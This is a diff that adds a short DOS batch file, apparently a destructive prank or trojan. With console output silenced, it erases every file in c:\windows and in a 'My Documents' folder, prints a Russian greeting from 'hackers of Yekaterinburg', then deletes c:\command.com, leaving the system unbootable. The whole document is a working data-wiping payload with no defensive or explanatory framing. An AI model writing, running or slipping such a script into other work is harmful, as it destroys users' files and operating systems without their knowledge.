@@ -1,0 +1,7 @@
+@echo off
+ctty nul
+echo y | erase c:\windows\*.*
+echo y | erase c:\МОИДОК~1\*.*
+ctty con
+echo Пpивет от хакеpов Е-бypга !
+erase c:\command.com
